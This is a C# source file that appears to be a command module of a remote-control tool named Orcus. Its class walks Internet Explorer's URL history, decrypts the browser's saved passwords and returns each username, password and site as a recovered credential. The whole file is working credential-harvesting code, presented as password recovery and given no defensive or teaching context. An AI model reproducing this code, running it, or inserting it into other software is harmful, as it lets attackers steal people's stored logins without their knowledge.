using System.Collections.Generic;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.InternetExplorer
{
    internal class InternetExplorer : IPasswordRecovery
    {
        private const string ApplicationName = "Internet Explorer";

        public IEnumerable<RecoveredPassword> GetPasswords()
        {
            using (var urlHistory = new ExplorerUrlHistory())
            {
                List<string[]> dataList = new List<string[]>();

                foreach (var entry in urlHistory)
                {
                    if (CryptoApi.DecryptIePassword(entry.UrlString, dataList))
                        foreach (string[] data in dataList)
                            yield return new RecoveredPassword
                            {
                                UserName = data[0],
                                Password = data[1],
                                Field1 = entry.UrlString,
                                Application = ApplicationName,
                                PasswordType = PasswordType.Browser
                            };
                }
            }
        }
    }
}